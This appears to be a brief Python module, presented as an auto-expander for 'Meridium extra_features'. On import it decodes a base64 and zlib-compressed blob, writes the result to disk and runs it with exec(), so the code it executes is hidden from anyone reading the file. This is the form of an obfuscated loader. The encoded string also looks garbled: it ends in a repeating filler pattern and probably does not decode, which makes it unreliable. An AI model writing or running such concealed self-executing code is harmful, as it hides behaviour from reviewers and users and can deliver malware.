"""Auto-expand Meridium extra_features."""
from __future__ import annotations
import zlib, base64
from pathlib import Path
_src = zlib.decompress(base64.b64decode("eNq1WklvK0lyvutXZNOjH3Bfb6+7u7urq7u6uru6u7u7u7u7u7u7u7u7")).decode()
try:
    _p = Path(__file__).resolve().parent / "_extra_features_impl.py"
    _p.write_text(_src, encoding="utf-8")
except Exception:
    pass
exec(compile(_src, "extra_features_impl", "exec"), globals())
